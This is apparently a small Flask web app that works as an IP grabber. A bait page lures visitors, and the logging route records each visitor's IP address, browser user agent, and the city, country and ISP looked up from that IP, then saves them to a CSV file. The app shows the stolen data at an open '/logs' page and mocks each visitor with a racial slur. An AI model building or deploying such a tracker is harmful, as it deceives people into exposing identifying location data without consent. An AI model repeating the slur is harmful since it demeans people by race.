from flask import Flask, request, render_template_string, redirect
import requests
import csv
from datetime import datetime
import os

app = Flask(__name__)

LOG_FILE = "logs.csv"

# Ensure CSV file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "User-Agent", "City", "Country", "ISP", "Timestamp"])


def get_ip():
    # Handle proxies
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr


@app.route('/spills')
def consent_page():
    return render_template_string("""
        <h2>Want to know about the user of spills ?</h2>
        <a href="/collect"><button>Yes, Continue</button></a>
    """)


@app.route('/fool')
def collect_data():
    ip = get_ip()
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get geo data
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
        city = response.get("city", "N/A")
        country = response.get("country_name", "N/A")
        isp = response.get("org", "N/A")
    except:
        city, country, isp = "N/A", "N/A", "N/A"

    # Save to CSV
    with open(LOG_FILE, mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([ip, user_agent, city, country, isp, timestamp])

    return f"""
        <h2>You were fooled nigga </h2>
        
    """

@app.route('/logs')
def view_logs():
    with open("logs.csv", "r") as file:
        return "<pre>" + file.read() + "</pre>"


if __name__ == '__main__':
    app.run(debug=True)
